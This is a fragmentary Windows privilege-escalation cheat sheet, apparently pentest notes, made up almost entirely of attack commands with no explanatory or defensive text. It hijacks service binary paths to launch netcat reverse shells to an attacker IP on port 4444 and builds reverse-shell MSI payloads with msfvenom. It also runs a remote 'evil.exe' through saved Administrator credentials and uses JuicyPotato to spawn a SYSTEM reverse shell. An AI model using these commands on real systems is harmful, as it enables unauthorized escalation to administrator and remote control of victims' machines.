...
sc config <service> binpath= "C:\nc.exe -e cmd.exe ${PRIVATE_IP} 4444"
sc stop <service>
sc start <service>
```
...
msfvenom -p windows/x64/shell_reverse_tcp LHOST=${PRIVATE_IP} LPORT=4444 -f msi -o evil.msi
...
runas /savecred /user:WORKGROUP\Administrator "\\${PRIVATE_IP}\share\evil.exe"
```
...
sc stop MyService
sc config MyService binpath= "${USER_HOME}\nc.exe ${PRIVATE_IP} 4444 -e cmd.exe"
sc start MyService
...
msfvenom -p windows/x64/shell_reverse_tcp LHOST=${PRIVATE_IP} LPORT=4444 -f msi -o shell.msi
...
# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c ${USER_HOME}\nc.exe ${PRIVATE_IP} 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
